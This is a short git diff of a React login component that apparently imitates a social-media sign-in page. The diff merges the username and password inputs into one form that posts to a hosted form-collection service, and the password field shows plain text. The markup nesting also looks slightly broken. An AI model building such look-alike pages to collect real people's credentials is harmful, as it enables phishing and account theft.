@@ -17,35 +17,25 @@ const  Upper = () => {
             </a>
               <div id="or">
                  ------------------------   OR   ------------------------
-             </div>
-
-
-              <div id='username'>
-               <form
+              </div>
+             <form
                 name ="username"
                 method ="post"
                 data-netlify="true"
                 onSubmit="submit"
                >
                <label id ='username2'>
+              <div id='username'>
                <input id="usinp" type="text" size={31 } placeholder=" Phone number, username, or email" />
-                
-                </label>
-               </form>
               </div>
+              </label>
 
               <div id='password'>
-               <form
-                    name ="password"
-                    method ="post"
-                    data-netlify="true"
-                    onSubmit="submit"
-               >
                 <label  id ='password2'>
                    <input id="psinp" type="text" size={31} placeholder=" password" />
                 </label>
+                </div>
                </form>
-              </div>
 
               <div id="forgotpas">
                  Forgot password?
